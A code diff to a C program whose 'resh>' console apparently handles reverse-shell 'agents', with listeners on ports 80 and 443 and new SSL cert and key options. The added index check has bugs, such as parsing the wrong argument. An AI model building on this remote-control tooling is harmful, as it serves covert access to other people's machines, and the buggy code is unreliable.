@@ -17,7 +17,7 @@ prompt(int p0, int p1, Agents *pa)
 	int i;
 	int l = sizeof(cmd);
 
-	printf("Now listening on port\nNo SSL:\t%d\nSSL:\t%d\n", p0, p1);
+	printf("Now listening on port\nNo SSL:\t%d\nSSL:\t%d\n\nFor help: help or ?\n", p0, p1);
 
 	while (1) {
 		printf("resh> ");
@@ -28,28 +28,44 @@ prompt(int p0, int p1, Agents *pa)
 			if (cmd[i] == '\n') /* strip newline */
 				cmd[i] = '\0';
 		}
+		if (!strlen(cmd))
+			continue; /* if no input, continue loop */
 		arg0 = strtok(cmd, " ");
 		arg1 = strtok(NULL, " ");
 
 		if (!strncmp(arg0, "help", l) || !strncmp(arg0, "?", l)) {
-			printf("Commands\n--------\n"
-				   "help\tPrints this menu\n"
-				   "agents\tList active agents\n"
-				   "listeners\tList listener ports\n"
-				   "interact\tInteract with and agent\n");
+			printf("\tCommands\n\t--------\n"
+				   "\thelp\t\tPrints this menu\n"
+				   "\tagents\t\tList active agents\n"
+				   "\tlisteners\t\tList listener ports\n"
+				   "\tinteract\t\tInteract with and agent\n");
 		} else if (!strncmp(arg0, "agents", l)) {
-			printf("Active Agents\n");
+			printf("\tActive Agents\n");
 			for (i = 0; i < MAXSHELLS; i++)
 				if (pa[i].alive)
-					printf("Index: %d\tSourceIP: %s\n", pa[i].index, pa[i].ip);
+					printf("\tIndex: %d\tSourceIP: %s\n", pa[i].index, pa[i].ip);
+			printf("\n");
 		} else if (!strncmp(arg0, "listeners", l)) {
-			printf("Listening on port\nNo SSL:\t%d\nSSL:\t%d\n\n", p0, p1);
+			printf("\tListening on port\n\tNo SSL:\t%d\n\tSSL:\t%d\n\n", p0, p1);
 		} else if (!strncmp(arg0, "interact", l)) {
 			if (!arg1) {
-				printf("Specify an index, example:\n> interact 1\n\n");
-				continue;
+				fprintf(stderr, "Specify an index, example:\n\t> interact 1\n\n");
+			} else {
+				int index, i;
+				for (i = 0; i < (int) strlen(arg1); i++)
+					if (!isdigit(arg1[i])) {
+						fprintf(stderr, "Not a valid index\n");
+						break;
+					}
+				index = atoi(arg0);
+				if (index > MAXSHELLS) {
+					fprintf(stderr, "Max index is %d\n", MAXSHELLS);
+					break;
+				}
+				if (!pa[index].alive) {
+					fprintf(stderr, "Agent not alive\n");
+				}
 			}
-			printf("conttest\n");
 		}
 	}
 }
@@ -83,15 +99,18 @@ rtrim(char *s)
 void
 usage(char *argv0)
 {
-	die("usage: %s [-hv] [-l port] [-L port] [-i]\n\n"
+	die("usage: %s [-hv] [-l port] [-L port] [-i] [-c cert] [-k key]\n\n"
 		"-l port\t\tListen port for no encryption. Default 80\n"
 		"-L port\t\tListen port for SSL encrypted traffic. Default 443\n"
 		"-i\t\tInteractive mode, use after the listening daemon is started\n"
-		, argv0);
+		"-k\t\tSSL private key to use. Default ./certs/srv.key\n"
+		"-c\t\tSSL cert to use. Default ./certs/srv.pem\n"
+		"\nExample:\n\t%s -c certs/srv.pem -k certs/srv.key\n"
+		, argv0, argv0);
 }
 
 unsigned
-grab_port(char *s)
+pgrab(char *s)
 {
 	int i;
 	long p;
@@ -104,6 +123,16 @@ grab_port(char *s)
 	if (p > 0xffff || p == 0)
 		die("Specify a valid port\n");
 	return p;
+}
+
+char *
+fgrab(char *f)
+{
+	if (access(f, F_OK) != -1)
+		return f;
+	else
+		die("Can't access %s\n", f);
+	return 0; /* never reached */
 }
 
 void
@@ -122,6 +151,7 @@ main(int argc, char **argv)
 {
 	int i;
 	unsigned port = 80, sslport = 443; /* Default ports */
+	char *cert = "certs/cert.pem", *key = "certs/key.pem";
 	pid_t pid;
 
 	for (i = 1; i < argc; i++) {
@@ -129,11 +159,17 @@ main(int argc, char **argv)
 			switch (*(++argv[i])) {
 			case 'l': /* Listen */
 				LASTARG(i);
-				port = grab_port(argv[++i]);
+				port = pgrab(argv[++i]);
 				break;
 			case 'L': /* SSL Listen */
 				LASTARG(i);
-				sslport = grab_port(argv[++i]);
+				sslport = pgrab(argv[++i]);
+				break;
+			case 'c':
+				cert = fgrab(argv[++i]);
+				break;
+			case 'k':
+				key = fgrab(argv[++i]);
 				break;
 			case 'v': /* version & help fall through */
 			case 'h':
@@ -159,7 +195,7 @@ main(int argc, char **argv)
 		banner();
 		prompt(port, sslport, pagents);
 	} else { /* parent */
-		listener(port, sslport, pagents, pid);
+		listener(port, sslport, pagents, pid, cert, key);
 	}
 	return 0;
 }
